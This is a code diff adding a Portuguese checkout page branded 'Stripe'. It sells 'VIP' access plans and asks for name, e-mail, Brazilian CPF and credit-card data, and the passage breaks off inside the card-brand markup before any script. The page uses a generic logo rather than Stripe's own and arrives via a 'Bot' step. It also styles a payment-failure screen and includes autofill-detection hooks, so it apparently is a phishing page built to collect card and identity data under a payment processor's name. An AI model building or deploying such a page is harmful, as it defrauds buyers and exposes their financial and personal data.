@@ -1,0 +1,1648 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#f6f7f9">
+<title>Checkout — Stripe</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+*,*::before,*::after{box-sizing:border-box}
+:root{
+  --ink:#0e1116;
+  --ink-2:#333a45;
+  --muted:#697080;
+  --faint:#9aa1ae;
+  --line:#e9ebef;
+  --line-2:#d9dde4;
+  --bg:#f6f7f9;
+  --paper:#fff;
+  --green:#0b7a5b;
+  --red:#c8384d;
+  --radius:16px;
+}
+html{-webkit-text-size-adjust:100%}
+body{
+  margin:0;background:var(--bg);color:var(--ink);
+  font:400 14px/1.5 Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;
+}
+button,input{font:inherit;color:inherit}
+button{cursor:pointer;border:0;background:none}
+svg{display:block}
+a{color:inherit}
+:focus-visible{outline:2px solid var(--ink);outline-offset:2px;border-radius:6px}
+
+.loader-overlay{
+  position:fixed;inset:0;z-index:100;background:#fff;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
+  transition:opacity .5s ease;
+}
+.loader-overlay.is-hidden{opacity:0;pointer-events:none}
+.loader-overlay{animation:loaderFailsafe .01s linear 5s forwards}
+@keyframes loaderFailsafe{to{opacity:0;visibility:hidden;pointer-events:none}}
+.loader-spin{
+  width:32px;height:32px;border-radius:50%;
+  border:2.5px solid var(--line);
+  border-top-color:var(--ink);
+  animation:loaderSpin .8s linear infinite;
+}
+.loader-text{margin:0;font-size:12px;color:var(--muted);letter-spacing:.02em}
+@keyframes loaderSpin{to{transform:rotate(360deg)}}
+
+.topbar{position:sticky;top:0;z-index:20;background:rgba(255,255,255,.86);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1060px;margin:0 auto;height:64px;padding:0 24px;display:flex;align-items:center;justify-content:space-between;gap:16px}
+.brand{display:inline-flex;align-items:center;gap:10px;text-decoration:none}
+.brand-mark{width:32px;height:32px;border-radius:9px;background:var(--ink);color:#fff;display:grid;place-items:center}
+.brand-mark svg{width:18px;height:18px}
+.brand-name{font-size:17px;font-weight:700;letter-spacing:-.03em}
+.secure-pill{display:inline-flex;align-items:center;gap:6px;height:30px;padding:0 11px;border:1px solid var(--line);border-radius:999px;background:#fff;color:var(--muted);font-size:11.5px;font-weight:500;white-space:nowrap}
+.secure-pill svg{width:13px;height:13px;color:var(--green)}
+
+.wrap{max-width:1060px;margin:0 auto;padding:34px 24px 72px}
+.page-head{margin-bottom:0}
+.back{display:inline-flex;align-items:center;gap:6px;color:var(--muted);font-size:12.5px;font-weight:500;text-decoration:none;margin-bottom:16px;transition:color .15s}
+.back:hover{color:var(--ink)}
+.back svg{width:13px;height:13px}
+.page-head h1{font-size:clamp(24px,3.2vw,30px);line-height:1.15;letter-spacing:-.035em;font-weight:700;margin:0 0 8px}
+.page-head p{margin:0;color:var(--muted);font-size:13.5px}
+
+.steps{display:flex;align-items:center;gap:12px;list-style:none;margin:22px 0 0;padding:0;font-size:12px;color:var(--faint)}
+.steps li{display:flex;align-items:center;gap:8px;font-weight:500}
+.steps li+li::before{content:"";display:block;width:34px;height:1px;background:var(--line-2);margin-right:4px}
+.dot{width:20px;height:20px;border-radius:50%;border:1px solid var(--line-2);background:#fff;display:grid;place-items:center;font-size:10px;font-weight:600;color:var(--faint);flex:none}
+.dot svg{width:11px;height:11px}
+.steps .is-current{color:var(--ink);font-weight:600}
+.steps .is-current .dot{background:var(--ink);border-color:var(--ink);color:#fff}
+.steps .is-done .dot{color:var(--ink-2)}
+
+.layout{display:grid;grid-template-columns:minmax(0,1fr) 372px;gap:22px;align-items:start;margin-top:24px}
+@media(min-width:961px){.summary{position:sticky;top:88px}}
+
+.card{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);box-shadow:0 1px 2px rgba(16,24,40,.035)}
+
+.form-card{padding:28px}
+.card-head{display:flex;align-items:flex-start;justify-content:space-between;gap:14px;margin-bottom:22px}
+.card-head h2{font-size:16px;font-weight:600;letter-spacing:-.02em;margin:0 0 5px}
+.card-head p{margin:0;font-size:12.5px;color:var(--muted)}
+.badge{flex:none;font-size:10.5px;font-weight:600;color:var(--ink-2);background:#f3f4f7;border:1px solid var(--line);border-radius:7px;padding:5px 8px;letter-spacing:.02em}
+
+.section-head{display:flex;align-items:center;gap:10px;margin:0 0 16px}
+.section-head:not(:first-child){margin-top:28px}
+.section-head h3{
+  margin:0;font-size:11px;font-weight:600;
+  letter-spacing:.08em;text-transform:uppercase;
+  color:var(--faint);
+  display:inline-flex;align-items:center;gap:7px;
+  flex:none;
+}
+.section-head h3 svg{width:14px;height:14px;opacity:.85;color:var(--muted)}
+.section-head::after{content:"";flex:1;height:1px;background:var(--line)}
+
+/* ===== Planos ===== */
+.plans{display:grid;gap:9px;margin:0 0 22px}
+.plan{
+  position:relative;display:flex;align-items:center;gap:11px;
+  padding:13px 14px;border:1px solid var(--line-2);border-radius:12px;
+  background:#fcfcfd;cursor:pointer;
+  transition:border-color .15s,background .15s,box-shadow .15s;
+}
+.plan:hover{border-color:#c6cbd4;background:#fff}
+.plan.is-selected{
+  border-color:var(--ink);background:#fff;
+  box-shadow:0 0 0 1px var(--ink) inset;
+}
+.plan-input{
+  position:absolute;opacity:0;width:1px;height:1px;
+  margin:0;pointer-events:none;
+}
+.plan-radio{
+  width:17px;height:17px;border-radius:50%;
+  border:1px solid var(--line-2);background:#fff;
+  flex:none;display:grid;place-items:center;
+  transition:border-color .15s;
+}
+.plan-radio::before{
+  content:"";width:8px;height:8px;border-radius:50%;
+  background:var(--ink);opacity:0;transform:scale(.5);
+  transition:opacity .15s,transform .15s;
+}
+.plan.is-selected .plan-radio{border-color:var(--ink)}
+.plan.is-selected .plan-radio::before{opacity:1;transform:scale(1)}
+.plan-input:focus-visible + .plan-radio{box-shadow:0 0 0 3px rgba(14,17,22,.18)}
+.plan-icon{
+  width:34px;height:34px;border-radius:9px;flex:none;
+  background:#f4f5f8;border:1px solid var(--line);
+  display:grid;place-items:center;line-height:1;
+  color:var(--ink-2);
+  transition:background .15s,border-color .15s,color .15s;
+}
+.plan-icon svg{width:18px;height:18px;display:block}
+.plan.is-selected .plan-icon{background:var(--ink);border-color:var(--ink);color:#fff}
+.plan-info{display:flex;flex-direction:column;gap:1px;min-width:0;flex:1}
+.plan-info strong{font-size:13px;font-weight:600;letter-spacing:-.01em}
+.plan-info small{font-size:11px;color:var(--muted)}
+.plan-price{font-size:13.5px;font-weight:700;white-space:nowrap;font-variant-numeric:tabular-nums}
+.plan-badge{
+  position:absolute;top:-7px;right:11px;
+  font-size:9px;font-weight:600;letter-spacing:.04em;
+  background:var(--ink);color:#fff;border-radius:5px;padding:2px 6px;
+  text-transform:uppercase;
+}
+
+.method{display:flex;align-items:center;gap:12px;padding:14px;border:1px solid var(--line-2);border-radius:12px;margin:0 0 22px;background:#fcfcfd;flex-wrap:wrap}
+.radio{width:16px;height:16px;border-radius:50%;border:5px solid var(--ink);box-shadow:inset 0 0 0 2px #fff,0 0 0 1px var(--ink);flex:none}
+.method-text{display:flex;flex-direction:column;gap:2px;min-width:0}
+.method-text strong{font-size:13px;font-weight:600}
+.method-text small{font-size:11.5px;color:var(--muted)}
+
+.brand-strip{display:flex;gap:6px;margin-left:auto}
+.brand-badge{display:block;width:40px;line-height:0;border-radius:5px;transition:opacity .18s,filter .18s,transform .18s;opacity:.55;filter:grayscale(.35)}
+.brand-badge svg{width:100%;height:auto}
+.brand-badge.is-active{opacity:1;filter:none;transform:translateY(-1px)}
+.brand-badge.is-dim{opacity:.28;filter:grayscale(1)}
+
+.field{margin-bottom:15px}
+.field label{display:flex;align-items:center;gap:6px;font-size:12px;font-weight:600;color:var(--ink-2);margin-bottom:7px}
+.help{width:14px;height:14px;border:1px solid var(--line-2);border-radius:50%;display:grid;place-items:center;font-size:9px;font-weight:700;color:var(--faint);background:#fff;padding:0;line-height:1}
+.help:hover{color:var(--ink-2);border-color:var(--line-2)}
+
+.input{
+  width:100%;height:46px;padding:0 14px;border:1px solid var(--line-2);border-radius:10px;
+  background:#fff;font-size:14px;color:var(--ink);outline:none;
+  transition:border-color .15s,box-shadow .15s,background .15s;
+}
+.input::placeholder{color:#adb3bf}
+.input:hover{border-color:#c6cbd4}
+.input:focus{border-color:var(--ink);box-shadow:0 0 0 3px rgba(14,17,22,.08)}
+.input.is-invalid{border-color:var(--red);box-shadow:0 0 0 3px rgba(200,56,77,.1)}
+.input.has-lead{padding-left:42px}
+.input.has-trail{padding-right:56px}
+.input:disabled{background:#f6f7f9;color:var(--muted)}
+
+@keyframes onAutoFillStart{from{}to{}}
+@keyframes onAutoFillCancel{from{}to{}}
+.input:-webkit-autofill{animation-name:onAutoFillStart;animation-duration:.01s}
+.input:not(:-webkit-autofill){animation-name:onAutoFillCancel;animation-duration:.01s}
+.input:-webkit-autofill,
+.input:-webkit-autofill:hover,
+.input:-webkit-autofill:focus,
+.input:-webkit-autofill:active{
+  -webkit-text-fill-color:var(--ink);
+  caret-color:var(--ink);
+  box-shadow:0 0 0 1000px #fff inset;
+  transition:background-color 600000s 0s,color 600000s 0s,border-color .15s;
+}
+.input:-webkit-autofill:focus{box-shadow:0 0 0 1000px #fff inset,0 0 0 3px rgba(14,17,22,.08)}
+.input.is-invalid:-webkit-autofill,
+.input.is-invalid:-webkit-autofill:focus{box-shadow:0 0 0 1000px #fff inset,0 0 0 3px rgba(200,56,77,.1)}
+
+.input-group{position:relative}
+.lead-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);width:17px;height:17px;color:var(--faint);pointer-events:none}
+.trail{position:absolute;right:12px;top:50%;transform:translateY(-50%);display:flex;align-items:center}
+.trail .brand-badge{width:34px;opacity:1;filter:none;transform:none}
+
+.row-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+
+.error{display:none;margin:6px 0 0;font-size:11.5px;line-height:1.4;color:var(--red)}
+.error.is-shown{display:block}
+
+.demo-note{display:flex;gap:9px;align-items:flex-start;padding:11px 13px;border:1px solid var(--line);background:#f8f9fb;border-radius:10px;color:var(--muted);font-size:11.5px;line-height:1.55;margin:6px 0 20px}
+.demo-note svg{width:14px;height:14px;flex:none;margin-top:1px;color:var(--faint)}
+
+.pay-btn{
+  width:100%;height:50px;border-radius:11px;background:var(--ink);color:#fff;
+  display:flex;align-items:center;justify-content:center;gap:9px;
+  font-size:14px;font-weight:600;letter-spacing:-.01em;
+  transition:background .16s,transform .16s,box-shadow .16s;
+  margin-top:6px;
+}
+.pay-btn svg{width:16px;height:16px;opacity:.9}
+.pay-btn:hover{background:#1c222b;box-shadow:0 8px 22px -10px rgba(14,17,22,.5)}
+.pay-btn:active{transform:translateY(1px)}
+.pay-btn:disabled{opacity:.7;cursor:progress}
+.spinner{width:15px;height:15px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none}
+.pay-btn.is-loading .spinner{display:block}
+.pay-btn.is-loading .btn-lock{display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.summary{padding:24px}
+.summary-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px}
+.summary-head h2{font-size:14px;font-weight:600;letter-spacing:-.01em;margin:0}
+.order-id{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10.5px;color:var(--faint);background:#f5f6f8;border:1px solid var(--line);border-radius:6px;padding:4px 7px}
+
+.product{display:flex;align-items:center;gap:13px;padding:16px 0;border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.thumb{width:52px;height:52px;flex:none;border-radius:12px;background:#f4f5f8;border:1px solid var(--line);display:grid;place-items:center;color:var(--ink-2);overflow:hidden}
+.thumb svg{width:26px;height:26px;opacity:.75}
+.thumb-img{width:100%;height:100%;object-fit:cover;display:block}
+.product-info{min-width:0;flex:1}
+.product-info h3{font-size:13.5px;font-weight:600;letter-spacing:-.01em;margin:0 0 3px}
+.product-info p{margin:0;font-size:11.5px;color:var(--muted);line-height:1.45}
+.tag{display:inline-block;margin-top:6px;font-size:10px;font-weight:500;color:var(--muted);background:#f5f6f8;border:1px solid var(--line);border-radius:5px;padding:2px 6px}
+.product-price{font-size:13.5px;font-weight:600;white-space:nowrap;align-self:flex-start;margin-top:2px}
+
+.lines{padding:14px 0 4px}
+.line{display:flex;justify-content:space-between;align-items:center;gap:12px;font-size:12.5px;color:var(--muted);padding:5px 0}
+.line span:last-child{color:var(--ink-2);font-weight:500;font-variant-numeric:tabular-nums}
+.line .discount.is-on{color:var(--green);font-weight:600}
+
+.coupon{margin:16px 0 18px}
+.coupon label{display:block;font-size:11.5px;font-weight:600;color:var(--ink-2);margin-bottom:7px}
+.coupon-row{display:flex;gap:7px}
+.coupon-row .input{height:40px;font-size:12.5px;text-transform:uppercase;letter-spacing:.03em}
+.coupon-row .input::placeholder{text-transform:none;letter-spacing:0}
+.btn-ghost{flex:none;height:40px;padding:0 15px;border:1px solid var(--line-2);border-radius:10px;background:#fff;font-size:12.5px;font-weight:600;color:var(--ink-2);transition:background .15s,border-color .15s,color .15s}
+.btn-ghost:hover{background:#f7f8fa;border-color:#c6cbd4;color:var(--ink)}
+.btn-ghost:disabled{background:#f6f7f9;color:var(--faint);cursor:default;border-color:var(--line)}
+.coupon-msg{margin:8px 0 0;font-size:11.5px;line-height:1.45;display:none}
+.coupon-msg.is-shown{display:block}
+.coupon-msg.ok{color:var(--green)}
+.coupon-msg.error{color:var(--red)}
+
+.total-row{display:flex;align-items:flex-end;justify-content:space-between;gap:12px;border-top:1px solid var(--line);padding-top:17px;margin-top:4px}
+.total-row>span{font-size:13px;font-weight:600}
+.total-value{text-align:right}
+.total-value strong{display:block;font-size:23px;font-weight:700;letter-spacing:-.035em;font-variant-numeric:tabular-nums;line-height:1.1}
+.total-value small{display:block;margin-top:4px;font-size:10.5px;color:var(--faint)}
+
+.assurance{margin-top:20px;border:1px solid var(--line);background:#fafbfc;border-radius:11px;padding:12px 13px;display:grid;gap:10px}
+.assurance div{display:flex;align-items:flex-start;gap:8px;font-size:11.5px;color:var(--muted);line-height:1.4}
+.assurance svg{width:14px;height:14px;flex:none;margin-top:1px;color:var(--green)}
+
+.footer{border-top:1px solid var(--line);background:#fff}
+.footer-inner{max-width:1060px;margin:0 auto;padding:20px 24px;display:flex;align-items:center;justify-content:space-between;gap:16px;font-size:12px;color:var(--faint)}
+.footer-links{display:flex;gap:18px}
+.footer-links a{text-decoration:none;transition:color .15s}
+.footer-links a:hover{color:var(--ink)}
+
+.error-screen{
+  position:fixed;inset:0;z-index:80;
+  display:flex;align-items:center;justify-content:center;
+  padding:20px;
+  background:rgba(14,17,22,.48);
+  backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
+  opacity:0;visibility:hidden;pointer-events:none;
+  transition:opacity .28s ease,visibility 0s linear .28s;
+}
+.error-screen.is-open{
+  opacity:1;visibility:visible;pointer-events:auto;
+  transition:opacity .3s ease,visibility 0s linear 0s;
+}
+.error-card{
+  width:100%;max-width:420px;background:#fff;
+  border-radius:20px;padding:34px 30px 24px;text-align:center;
+  box-shadow:0 32px 80px -20px rgba(14,17,22,.45),0 8px 24px -14px rgba(14,17,22,.22);
+  transform:translateY(18px) scale(.985);opacity:0;
+  transition:transform .34s cubic-bezier(.2,.7,.3,1),opacity .3s ease;
+  max-height:calc(100vh - 40px);overflow-y:auto;
+}
+.error-screen.is-open .error-card{transform:none;opacity:1}
+
+.error-icon{
+  width:60px;height:60px;border-radius:50%;
+  background:#fdecef;color:var(--red);
+  display:grid;place-items:center;margin:0 auto 18px;
+}
+.error-icon svg{width:28px;height:28px}
+.error-screen.is-open .error-icon{animation:errorPulse 1.3s ease-out .12s 1}
+@keyframes errorPulse{
+  0%{box-shadow:0 0 0 0 rgba(200,56,77,.32)}
+  70%{box-shadow:0 0 0 16px rgba(200,56,77,0)}
+  100%{box-shadow:0 0 0 0 rgba(200,56,77,0)}
+}
+
+.error-card h2{font-size:19.5px;line-height:1.25;font-weight:700;letter-spacing:-.025em;margin:0 0 8px;color:var(--ink)}
+.error-sub{margin:0 0 22px;font-size:13px;line-height:1.55;color:var(--muted)}
+
+.error-summary{
+  border:1px solid var(--line);border-radius:12px;
+  padding:14px 16px;margin-bottom:14px;background:#fcfcfd;
+  display:grid;gap:9px;
+}
+.error-row{display:flex;align-items:center;justify-content:space-between;gap:14px;font-size:12.5px}
+.error-row span:first-child{color:var(--muted);font-weight:500}
+.error-row span:last-child{color:var(--ink);font-weight:600;font-variant-numeric:tabular-nums;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;letter-spacing:.01em}
+
+.error-reason{margin:0 0 22px;font-size:11.5px;color:var(--faint);letter-spacing:.01em}
+
+.error-primary{
+  width:100%;height:46px;border-radius:11px;background:var(--ink);color:#fff;
+  font-size:13.5px;font-weight:600;letter-spacing:-.005em;
+  transition:background .15s,transform .15s,box-shadow .15s;
+  margin-bottom:9px;
+}
+.error-primary:hover{background:#1c222b;box-shadow:0 8px 22px -10px rgba(14,17,22,.5)}
+.error-primary:active{transform:translateY(1px)}
+
+.error-secondary{
+  width:100%;height:44px;border-radius:11px;background:#fff;color:var(--ink-2);
+  border:1px solid var(--line-2);font-size:13px;font-weight:600;
+  transition:background .15s,border-color .15s,color .15s;
+  margin-bottom:18px;
+}
+.error-secondary:hover{background:#f7f8fa;border-color:#c6cbd4;color:var(--ink)}
+.error-secondary:active{transform:translateY(1px)}
+
+.error-safe{
+  display:inline-flex;align-items:center;justify-content:center;gap:6px;
+  margin:0 0 8px;font-size:11.5px;color:var(--muted);
+}
+.error-safe svg{width:13px;height:13px;color:var(--green);flex:none}
+
+.error-help{margin:0;font-size:11px;color:var(--faint)}
+.error-help a{color:var(--ink-2);text-decoration:none;font-weight:500}
+.error-help a:hover{color:var(--ink);text-decoration:underline}
+
+@media(max-width:600px){
+  .error-screen{padding:0;align-items:flex-end}
+  .error-card{
+    max-width:none;border-radius:22px 22px 0 0;
+    padding:30px 22px calc(20px + env(safe-area-inset-bottom,0px));
+    transform:translateY(100%);max-height:100vh;
+  }
+  .error-screen.is-open .error-card{transform:none}
+  .error-card h2{font-size:18px}
+}
+
+@media(prefers-reduced-motion:reduce){
+  .error-screen,.error-card,.error-icon{transition:none!important;animation:none!important;transform:none!important}
+  .error-screen{opacity:1}
+  .error-screen:not(.is-open){opacity:0}
+}
+
+.toast{position:fixed;left:50%;bottom:24px;transform:translate(-50%,14px);z-index:60;background:var(--ink);color:#fff;font-size:12.5px;padding:11px 16px;border-radius:10px;box-shadow:0 16px 40px -12px rgba(14,17,22,.5);opacity:0;pointer-events:none;transition:opacity .2s,transform .2s;max-width:calc(100% - 32px);text-align:center}
+.toast.is-shown{opacity:1;transform:translate(-50%,0)}
+
+@media(max-width:960px){
+  .layout{grid-template-columns:1fr;gap:16px}
+  .summary{order:0}
+  .form-card{order:1}
+}
+@media(max-width:760px){
+  .wrap{padding:24px 16px 56px}
+  .topbar-inner{height:58px;padding:0 16px}
+  .form-card,.summary{padding:20px}
+  .input{font-size:16px;height:48px}
+  .coupon-row .input{height:42px}
+  .footer-inner{padding:18px 16px;flex-direction:column;align-items:center;text-align:center}
+  .steps{font-size:11px;gap:8px}
+  .steps li+li::before{width:18px}
+  .brand-strip{margin-left:0;width:100%;justify-content:flex-start;padding-top:2px}
+}
+@media(max-width:400px){
+  .secure-pill span{display:none}
+  .secure-pill{padding:0 9px}
+  .row-2{grid-template-columns:1fr}
+  .brand-badge{width:36px}
+  .total-value strong{font-size:21px}
+  .plan{padding:11px 12px;gap:9px}
+  .plan-icon{width:30px;height:30px}
+  .plan-icon svg{width:16px;height:16px}
+  .plan-price{font-size:12.5px}
+}
+@media(prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation-duration:.001ms!important;transition-duration:.001ms!important}
+  .loader-spin{animation-duration:1.2s!important}
+}
+</style>
+</head>
+<body>
+
+<div class="loader-overlay" id="loaderOverlay" aria-hidden="true">
+  <div class="loader-spin"></div>
+  <p class="loader-text">Carregando…</p>
+</div>
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="brand" href="#" aria-label="Stripe — início">
+      <span class="brand-mark" aria-hidden="true">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M4.5 17 12 4l7.5 13H4.5Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M8.5 17 12 10.7 15.5 17" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>
+      </span>
+      <span class="brand-name">stripe</span>
+    </a>
+    <span class="secure-pill">
+      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="5" y="10.2" width="14" height="10.3" rx="2.6" stroke="currentColor" stroke-width="1.8"/><path d="M8.6 10.2V7.6a3.4 3.4 0 0 1 6.8 0v2.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+      <span>Pagamento seguro</span>
+    </span>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <div class="page-head">
+    <a class="back" href="#" id="backLink">
+      <svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M19 12H5m6-6-6 6 6 6" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Voltar ao carrinho
+    </a>
+    <h1>Finalizar compra</h1>
+    <p>Escolha seu plano e conclua o pagamento com segurança.</p>
+
+    <ol class="steps" aria-label="Etapas do checkout">
+      <li class="is-done"><span class="dot" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none"><path d="m5 12 4 4L19 6" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg></span>Bot</li>
+      <li class="is-current" aria-current="step"><span class="dot" aria-hidden="true">2</span>Pagamento</li>
+      <li><span class="dot" aria-hidden="true">3</span>Confirmação</li>
+    </ol>
+  </div>
+
+  <div class="layout">
+
+    <section class="card form-card" aria-labelledby="payTitle">
+      <div class="card-head">
+        <div>
+          <h2 id="payTitle">Dados do pagamento</h2>
+          <p>Escolha seu plano e informe os dados do cartão de crédito.</p>
+        </div>
+        <span class="badge">Etapa 2 de 3</span>
+      </div>
+
+      <form id="checkoutForm" novalidate autocomplete="on">
+
+        <!-- ===== Planos ===== -->
+        <div class="section-head">
+          <h3>
+            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <path d="M12 3.2 19 6v5.2c0 4.4-2.8 7.6-7 9.8-4.2-2.2-7-5.4-7-9.8V6l7-2.8Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
+              <path d="m9 12 2 2 4-4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            Escolha seu plano
+          </h3>
+        </div>
+
+        <div class="plans" role="radiogroup" aria-label="Escolha seu plano">
+          <label class="plan" data-plan="teste">
+            <input class="plan-input" type="radio" name="plan" value="teste">
+            <span class="plan-radio" aria-hidden="true"></span>
+            <span class="plan-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" fill="none">
+                <path d="M9.5 3h5M10 3v6.2L5.4 18.1A2 2 0 0 0 7.2 21h9.6a2 2 0 0 0 1.8-2.9L14 9.2V3" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M7.2 15h9.6" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/>
+              </svg>
+            </span>
+            <span class="plan-info">
+              <strong>Teste 7 dias</strong>
+              <small>Acesso por 7 dias</small>
+            </span>
+            <span class="plan-price">R$ 9,90</span>
+          </label>
+
+          <label class="plan is-selected" data-plan="mensal">
+            <input class="plan-input" type="radio" name="plan" value="mensal" checked>
+            <span class="plan-radio" aria-hidden="true"></span>
+            <span class="plan-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" fill="none">
+                <path d="M6 4h12l3 5-9 12L3 9l3-5Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
+                <path d="M3 9h18M9 4 7 9l5 12M15 4l2 5-5 12" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
+              </svg>
+            </span>
+            <span class="plan-info">
+              <strong>VIP Mensal</strong>
+              <small>Acesso por 30 dias</small>
+            </span>
+            <span class="plan-price">R$ 14,90</span>
+          </label>
+
+          <label class="plan" data-plan="trimestral">
+            <span class="plan-badge">Popular</span>
+            <input class="plan-input" type="radio" name="plan" value="trimestral">
+            <span class="plan-radio" aria-hidden="true"></span>
+            <span class="plan-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" fill="none">
+                <path d="M12 15c-1.5 0-3-1.5-3-3 0-5 3-9 3-9s3 4 3 9c0 1.5-1.5 3-3 3Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
+                <circle cx="12" cy="9.5" r="1.2" stroke="currentColor" stroke-width="1.7"/>
+                <path d="M9 13c-1 1-2 2-2 4l2-1ZM15 13c1 1 2 2 2 4l-2-1Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
+              </svg>
+            </span>
+            <span class="plan-info">
+              <strong>VIP 3 Meses</strong>
+              <small>Acesso por 90 dias</small>
+            </span>
+            <span class="plan-price">R$ 34,90</span>
+          </label>
+
+          <label class="plan" data-plan="vitalicio">
+            <input class="plan-input" type="radio" name="plan" value="vitalicio">
+            <span class="plan-radio" aria-hidden="true"></span>
+            <span class="plan-icon" aria-hidden="true">
+              <svg viewBox="0 0 24 24" fill="none">
+                <path d="M3 8l4 3 5-6 5 6 4-3-2 11H5L3 8Z" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round"/>
+                <path d="M6.5 16h11" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/>
+              </svg>
+            </span>
+            <span class="plan-info">
+              <strong>Vitalício</strong>
+              <small>Acesso para sempre</small>
+            </span>
+            <span class="plan-price">R$ 49,90</span>
+          </label>
+        </div>
+
+        <!-- ===== Dados pessoais ===== -->
+        <div class="section-head">
+          <h3>
+            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <circle cx="12" cy="8" r="3.6" stroke="currentColor" stroke-width="1.7"/>
+              <path d="M5 19.5c.8-3.4 3.6-5.4 7-5.4s6.2 2 7 5.4" stroke="currentColor" stroke-width="1.7" stroke-linecap="round"/>
+            </svg>
+            Seus dados
+          </h3>
+        </div>
+
+        <div class="field">
+          <label for="fullname">Nome completo</label>
+          <input class="input" id="fullname" name="fullname" type="text" placeholder="Ex.: Maria da Silva Santos" autocomplete="name" maxlength="80" aria-required="true" aria-describedby="err-fullname">
+          <p class="error" id="err-fullname" role="alert"></p>
+        </div>
+
+        <div class="field">
+          <label for="email">E-mail</label>
+          <div class="input-group">
+            <svg class="lead-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <rect x="3" y="5.5" width="18" height="13" rx="2.4" stroke="currentColor" stroke-width="1.7"/>
+              <path d="m4 7 8 6 8-6" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <input class="input has-lead" id="email" name="email" type="email" inputmode="email" placeholder="seuemail@gmail.com" autocomplete="email" maxlength="254" autocapitalize="none" spellcheck="false" aria-required="true" aria-describedby="err-email">
+          </div>
+          <p class="error" id="err-email" role="alert"></p>
+        </div>
+
+        <div class="field">
+          <label for="cpf">CPF</label>
+          <input class="input" id="cpf" name="cpf" type="text" inputmode="numeric" placeholder="000.000.000-00" autocomplete="off" maxlength="14" aria-required="true" aria-describedby="err-cpf">
+          <p class="error" id="err-cpf" role="alert"></p>
+        </div>
+
+        <!-- ===== Cartão ===== -->
+        <div class="section-head">
+          <h3>
+            <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <rect x="3" y="5.5" width="18" height="13" rx="2.6" stroke="currentColor" stroke-width="1.7"/>
+              <path d="M3 10h18" stroke="currentColor" stroke-width="1.7"/>
+            </svg>
+            Dados do cartão
+          </h3>
+        </div>
+
+        <div class="method">
+          <span class="radio" aria-hidden="true"></span>
+          <div class="method-text">
+            <strong>Cartão de crédito</strong>
+            <small>Pagamento único · à vista</small>
+          </div>
+          <div class="brand-strip" id="brandStrip" aria-hidden="true">
+            <span class="brand-badge" data-brand="visa">
+              <svg viewBox="0 0 44 28"><rect x=".5" y=".5" width="43" height="27" rx="4.5" fill="#fff" stroke="#e6e8ec"/><text x="22" y="18.8" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="10.5" font-weight="800" font-style="italic" fill="#1a1f71" letter-spacing=".2">VISA</text></svg>
+            </span>
+            <span class="brand-badge" data-brand="mastercard">
+              <svg viewBox="0 0 44 28"><rect x=".5" y=".5" width="43" height="27" rx="4.5" fill="#fff" stroke="#e6e8ec"/><circle cx="18.4" cy="14" r="7.2" fill="#eb001b"/><circle cx="25.6" cy="14" r="7.2" fill="#f79e1b" fill-opacity=".88"/></svg>
+            </span>
+            <span class="brand-badge" data-brand="amex">
+              <svg viewBox="0 0 44 28"><rect x=".5" y=".5" width="43" height="27" rx="4.5" fill="#2e77bc"/><text x="22" y="18" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="8.5" font-weight="800" fill="#fff" letter-spacing=".4">AMEX</text></svg>
+            </span>
+            <span class="brand-badge" data-brand="elo">
